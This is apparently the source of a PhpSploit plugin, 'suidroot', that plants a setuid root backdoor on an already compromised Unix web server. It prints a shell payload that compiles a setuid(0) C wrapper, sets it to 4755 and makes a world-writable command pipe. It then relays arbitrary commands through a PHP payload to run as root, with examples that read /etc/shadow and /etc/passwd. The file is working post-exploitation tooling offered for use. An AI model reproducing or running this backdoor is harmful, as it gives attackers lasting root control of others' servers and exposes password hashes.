"""Setuid backdoor handler

SYNOPSIS:
    suidroot --create <SUIDROOT_BACKDOOR> <SUIDROOT_PIPE>
    suidroot "<COMMAND>"

DESCRIPTION:
    This plugin provides a simple way to install a setuid(2)
    backdoor, and use it for presistent privilege escalation
    through phpsploit.

    Environment variables:
    <SUIDROOT_BACKDOOR> - The setuid backdoor file to create
    <SUIDROOT_PIPE> - The file used to store next command

    NOTES:
    - This plugin only performs root access persistance
    from a previously obtained access.
    - Only works on unix like systems with command execution
    available.
    - In order to work properly, unprivileged user must
    have execution access to <SUIDROOT_BACKDOOR> file
    - In order to work properly, unprivileged user must have
    write permissions on <SUIDROOT_PIPE> file

WARNING:
    Considering the PhpSploit's input parser, commands which
    contain quotes, semicolons, and other chars that could be
    interpreted by the framework MUST be enquoted to be
    interpreted as a single argument. For example:
      > run echo 'foo bar' > /tmp/foobar; cat /etc/passwd
    In this case, quotes and semicolons will be interpreted by
    the framwework, so the correct syntax is:
      > run "echo 'foo bar' > /tmp/foobar; cat /etc/passwd"

EXAMPLES:
    > suidroot --create /tmp/backdoor /tmp/backdoor-batch.sh
      - Generates the payload to be run as root in order
        to enable persistance through phpsploit
    > suidroot cat /tmp/shadow
      - Print the /etc/shadow data as root
    > suidroot "whoami; id"
      - Show your current user and id (enjoy!)

ENVIRONMENT:
    * SUIDROOT_BACKDOOR
        The setuid(2) backdoor file
    * SUIDROOT_PIPE
        The SUIDROOT_BACKDOOR's command repsonse recipient
    * SUIDROOT_PWD
        Current working directory for privileged user

AUTHOR:
    nil0x42 <http://goo.gl/kb2wf>
"""

import sys

import ui.color
import ui.input

from api import plugin
from api import server
from api import environ

SUIDROOT_ENV_VARS = {"SUIDROOT_BACKDOOR", "SUIDROOT_PIPE", "SUIDROOT_PWD"}

if environ["PLATFORM"].lower().startswith("win"):
    sys.exit("Plugin available on unix-based platforms only")

if len(plugin.argv) < 2:
    sys.exit(plugin.help)

if plugin.argv[1] == '--create':
    if len(plugin.argv) != 4:
        sys.exit(plugin.help)

    # the third arg determines this setuid file to use
    backdoor_file = server.path.abspath(plugin.argv[2])
    pipe_file = server.path.abspath(plugin.argv[3])

    suid_dir = server.path.dirname(backdoor_file)

    # create the payload that must be run as privileged used.
    # The suidroot backdoor is then created with suid byte
    # enabled, making tunnel available.
    payload = ("echo -e 'main(){setuid(0);system(\"%p\");}'>%f;"
               "gcc -x c -o %f %f;"
               "chown root %f;"
               "chmod 4755 %f;"
               "touch %p;"
               "chmod 777 %p;" # write AND execution required for `others`
               ).replace('%f', backdoor_file).replace('%p', pipe_file)

    # prevent previous configuration override
    if SUIDROOT_ENV_VARS.issubset(set(environ)):
        msg = "suidroot environment variables already set. override them ?"
        if ui.input.Expect(False, skip_interrupt=False)(msg):
            sys.exit("Operation canceled")

    print("[*] In order to use suidroot privileged command execution, "
          "run the following shell payload AS ROOT on the remote system:")
    print(ui.color.colorize("\n", "%Blue", payload, "\n"))

    environ['SUIDROOT_BACKDOOR'] = backdoor_file
    environ['SUIDROOT_PIPE'] = pipe_file
    environ['SUIDROOT_PWD'] = environ['PWD']
    sys.exit()


# On classic command pass, make sure the exploit is activated
for var in SUIDROOT_ENV_VARS:
    msg = "Missing environment variable: %s: Use 'suidroot --create'"
    if var not in environ:
        sys.exit(msg % var)

# build the command to send from given arguments
command = 'cd ' + environ['SUIDROOT_PWD'] + '\n'  # goto exploit current dir
command += (' '.join(plugin.argv[1:])) + '\n'  # the joined user arguments
command += 'echo -e "\\nsuid" `pwd` suid' # token to make sure new pwd is known

# build the payload to send the command to run on system
payload = server.payload.Payload("payload.php")
payload['BACKDOOR'] = environ['SUIDROOT_BACKDOOR']
payload['PIPE'] = environ['SUIDROOT_PIPE']
payload['COMMAND'] = command

output = payload.send()

lines = output.splitlines()
if not lines:
    sys.exit("")

new_pwd = lines[-1]
response = "\n".join(lines[:-1])

try:
    assert new_pwd.startswith("suid ")
    assert new_pwd.endswith(" suid")
    new_pwd = new_pwd[5:-5]
    assert server.path.isabs(new_pwd)
    environ['SUIDROOT_PWD'] = new_pwd
except AssertionError:
    print("[-] Couldn't retrieve new $PWD.")
    print("[-] Raw output:")
    print(output)

# finaly, print the command response
print(response)
